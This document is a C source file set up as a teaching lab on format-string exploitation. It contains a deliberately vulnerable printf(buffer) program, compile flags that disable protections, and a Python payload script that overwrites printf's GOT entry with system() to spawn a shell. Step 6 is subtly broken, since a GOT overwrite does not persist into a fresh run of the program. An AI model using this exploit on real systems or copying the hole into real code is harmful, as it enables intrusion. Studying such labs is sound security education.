/*
Since a program could use a function in a shared library many times, it uses 2 tables:
    - PLT (Procedure Linkage Table)
    - GOT (Global Offset Table)


What are PLT and GOT?
	When a program uses functions like printf, system, etc. (from shared libraries like libc), it doesn’t know their real address right away.
	So it uses two special tables:

    1. PLT (Procedure Linkage Table):
        Contains jump instructions.  
        It says: “To call printf, jump to the address stored in the GOT.”

    2. GOT (Global Offset Table)
	    A table of function addresses.
		At the beginning, it’s empty → the first time you call printf, the dynamic linker finds the real address and fills it in.
		After that, all future calls go directly to the address stored in the GOT.
- - - - - - -

Why do hackers love this?
	•	The PLT is read-only ❌
	•	But the GOT is writable ✅

    So if an attacker overwrites an entry in the GOT, they can make the program do:
        when it calls printf() → it actually runs system("/bin/sh") (run my shellcode)
- - - - - - - - - - - - - - - - - - - - - - - - - - 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
==========================
Format String Exploit Lab
==========================

Vulnerability: 
    This program reads user input into a buffer, then passes that buffer
    directly to printf() without using a format string → format string vulnerability.

Exploit Goal:
    - Overwrite the GOT entry of printf() with the address of system()
    - Then call printf("/bin/sh") to actually run system("/bin/sh")
    - Get a shell 🐚

Compilation:
    gcc -m32 -fno-stack-protector -no-pie vuln.c -o vuln

Why these flags?
    - -m32: keeps it in 32-bit mode (GOT entries = 4 bytes)
    - -fno-stack-protector: disables stack canary
    - -no-pie: ensures predictable, static addresses (no ASLR for code)
*/

int main() {
    char buffer[256];

    printf("Enter input: ");

    // 🧨 VULNERABLE: this takes user input and passes it directly to printf()
    // If the user types format specifiers (like %x or %n), they will be interpreted!
    fgets(buffer, sizeof(buffer), stdin);

    // FORMAT STRING BUG: attacker controls the format string
    printf(buffer);

    // At this point, if the GOT of printf() was overwritten with system(),
    // the call above would actually run system(user_input)
    //
    // So, if user_input == "/bin/sh", this becomes: system("/bin/sh");
    
    return 0;
}

/*
========================
 Exploit Steps Recap
========================

1. Find printf() GOT address:
        objdump -R vuln | grep printf
        Example: 0x0804a010

2. Get system() address:
        gdb ./vuln
        (gdb) p system
        Example: 0xf7e12420

3. Split system() address:
        Lower half: 0x2420
        Upper half: 0xf7e1

4. Use a Python script to create a payload that:
        - Places 0x0804a010 and 0x0804a012 (GOT + 2) on the stack
        - Uses padding to print enough characters to write:
            * 0x2420 to 0x0804a010
            * 0xf7e1 to 0x0804a012
        
------------------------------------------------------
'''exploit.py''' 
------------------------------------------------------
    from struct import pack

    # Addresses
    printf_got  = 0x0804a010
    system_addr = 0xf7e12420

    lower = system_addr & 0xffff        # 0x2420
    upper = (system_addr >> 16) & 0xffff  # 0xf7e1
    offset = 7  # May vary depending on stack layout

    # Payload layout
    payload  = pack("<I", printf_got)
    payload += pack("<I", printf_got + 2)

    pad1 = lower - len(payload)
    pad2 = (upper - lower) % 0x10000

    payload += f"%{pad1}x%{offset}$hn".encode()
    payload += f"%{pad2}x%{offset+1}$hn".encode()

    print(payload)
------------------------------------------------------

5. Run the exploit:
        python3 exploit.py | ./vuln

6. Trigger the shell:
        ./vuln
        Input: /bin/sh

    If printf() was correctly overwritten, this becomes:
        system("/bin/sh");

    And you'll get a shell 🐚

- - - - - - - - - - - - - - -

(the exploit.py script):

              STACK (inside printf)
+----------------------------------------+
| arg1 → 0x0804a010 (GOT printf addr)    | <-- %7$hn writes here
| arg2 → 0x0804a012 (GOT printf + 2)     | <-- %8$hn writes here
| "    %1234x%7$hn%5678x%8$hn"           |
+----------------------------------------+

*/
